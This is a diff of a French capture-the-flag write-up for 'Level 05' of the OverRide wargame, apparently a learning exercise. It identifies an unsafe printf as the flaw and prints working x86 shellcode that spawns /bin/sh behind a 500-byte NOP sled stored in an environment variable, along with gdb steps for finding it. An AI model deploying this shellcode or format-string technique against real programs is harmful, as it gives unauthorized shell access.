@@ -1,6 +1,6 @@
 # Level 05
 
-Le programme decompile nous montre un programme qui attend une entree utilisateur et retourne la meme chaine en minuscule.
+Le code decompilé nous montre un programme qui attend une entrée utilisateur et retourne la meme chaine en minuscule.
 
 Le printf non securise est la faille a exploiter.
 
@@ -20,14 +20,12 @@ Nous allons ecrire un shellcode avec nopsled dans une variable d'environnement, 
 export EXPLOIT=$(python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
 
 level05@OverRide:~$ gdb ./level05
-
+(gdb) b main
 Breakpoint 1 at 0x8048449
 (gdb) run
 Starting program: /home/users/level05/level05
 
 Breakpoint 1, 0x08048449 in main ()
-(gdb) x/200s
-Argument required (starting display address).
 
 (gdb) x/200s environ
 
